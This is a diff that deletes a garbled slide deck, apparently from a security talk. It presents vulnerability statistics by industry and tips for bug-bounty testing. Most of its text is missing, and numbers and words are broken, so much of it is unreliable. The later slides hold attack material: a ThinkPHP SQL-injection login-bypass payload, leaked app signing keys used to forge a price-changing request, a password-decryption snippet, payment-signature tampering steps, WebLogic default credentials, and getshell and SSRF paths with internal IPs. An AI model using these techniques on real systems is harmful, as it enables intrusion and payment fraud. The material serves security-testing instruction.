@@ -1,292 +1,0 @@
-
- 
-
-
-  
-
-
-Analysis of security vulnerability in different industries
-
-
-
-
-Traditional Internet enterprises
-
-
- 
-23.41%.
-
-01
-
-
- 12.77%.
-
-02
-
-
- 12.77%.
-
-03
-
-
-Statistics of vulnerability proportion
-
-04
-
-
- 11.83%
-
-05
-
-XSS 
- 26.59%
-
-06
-
-
- 12.63%
-
-
-
-
- 33.33%.
-
-
-Financial industry
-
-01
-
-02
-
-
- 9.34%.
-
-
-
-03
-
-28.22%.
-
-
-05
-
-10.23%.
-
-04
-
-
-
-XSS
-
-
-
-8.55%
-
-06
-
-
-
- 10.33%.
-
-
-
-Traditional industry manufacturing
-
-44.12%
-
-25.22%
-
-10.23%
-
-20.43%
-
-
- 
-44.12%.
-
-XSS
- 25.22%.
-
-
- 10.23%.
-
-
- 20.43%.
-
-
-Changes of security vulnerability types in crowd testing environment
-
-
-
- .
-
-80000 RMB.
-
-""SQL
-20w+.
-
-30000 RMB.
-
-
-
-
-
-
-
-  
-
-VS 
-
-  
-
-
-
-1 2
-
-1VPN- 2-.
-
-
-1  2  3IP  
-
-1 230%+ 70%10~50 
-
-
- 
-
- .
-
-
-
- 
-
-
-
-
-Tips for vulnerability mining in current security environment
-
-
-
-
-
-
-""""  https://xx.xx.xx.cn/glivec/api/init/v2
- 
-
-
-
-appsign SHA1InitV2
-sign  IDAso xx.xx.xx_common_util_JniUtil_decryptionInderalKey *xxxxxxxJ*2f@rlJc2I@Of&t9VH2IxZF xx.xx.xx_common_util_JniUtil_decryptionPostgraduateKey *xxxxxxx#8vg(^L(y&%K34MTCIZ@
-signsign Java hashmap SHA1sign
-active=0&appSignKey=*xxxxxxxx*2f@rlJc2I@Of&t9VH2IxZF&priceOriginal=9 800&priceOriginalDiscount=0&priceRenew=3000&priceRenewDiscount=0
- active=3&appSignKey=*xxxxxxxx*2f@rlJc2I@Of&t9VH2IxZF&expireDate=202 0-12-12 22:00:00&priceOriginal=9800&priceOriginalDiscount=0&priceRenew=3000& priceRenewDiscount=0
-
-
-{ "success": true, "message": "", "results": { "item": { "active": 3, "expireDate": "2020-12-12 22:00:00", "priceRenew": 3000, "priceOriginal": 9800, "priceRenewDiscount": 0, "priceOriginalDiscount": 0, "sign": "xxxxxx9d9c3845fb9de62af 32722ce96b756aec0e " } }, "errorCode": 0 }
-
-
-
-
-
-
-
-RhinoJavaScriptRhino jarJavaScriptJava JavaJavaScript
-
-
-
-
-
-
-
-thinkphp PHPmd5( )=null Payload: account[]=exp &account[1]==1 or 1 like 1 %23 &password[]=admin &verify=1639
-
-
-
-
-
-
-
-
-
-
-
-
-
- .idea/webServers.xml
-
-
-# python3 import binascii pwd = "XXXXXXXXXXXdfc0dfd9dfcedf9adf93df9adf93" decrypted = '' while (len(pwd) > 0):
-decrypted += chr(int(pwd[:4], 16) ^ int('dfaa', 16)) pwd = pwd[4:len(pwd) - 1] print(decrypted)
-
-
-
-
- 
-
-
-
-Step 1
-
-1v_gro=o1d&Idti=m8e5s9ta7m&pv_=n1u1m0 be
-
-redirect:
-
-4
-
-url=https://api.xxxpay.
-
-v_amount=v_goodId*v_number message=v_amount+timestamp salt=sha(key) sign=sha(message+salt)
-
-com/?v_amount=xxx& e-shop Server
-
-timestamp=xxx&sign=
-
-2
-
-asdfw8e89
-
-Step 2
-
-get key
-
-key=8rj4
-
-3 5 message=xxx&timestamp=
-
-Step 3 xxx&sign=asdfw8e89
-
-result
-
-6
-
-Payment Server
-
- 
-
-
-
-
-
-
-
-
-
-
-
-
-·www.xx.xx.xx.com  weblogic weblogic/weblogic1 ·/bea_wls_deployment_internal/DeploymentServiceGetshell
-
-
-·SSRF: uudiexplorer/SearchPublicRegistries.jsp
-Weblogic SSRFurlPOST
-·1URL: https://www.xx.xx.com:442/_async/AsyncResponseServiceHttps?wsdl IP10.120.113.201:8002 ­ 10.120.113.205:8002
-
-
-·WAF ·VPSWEB302
-
-
-Q&A
-  
-
-  liang.yao@tophant.com
-
-
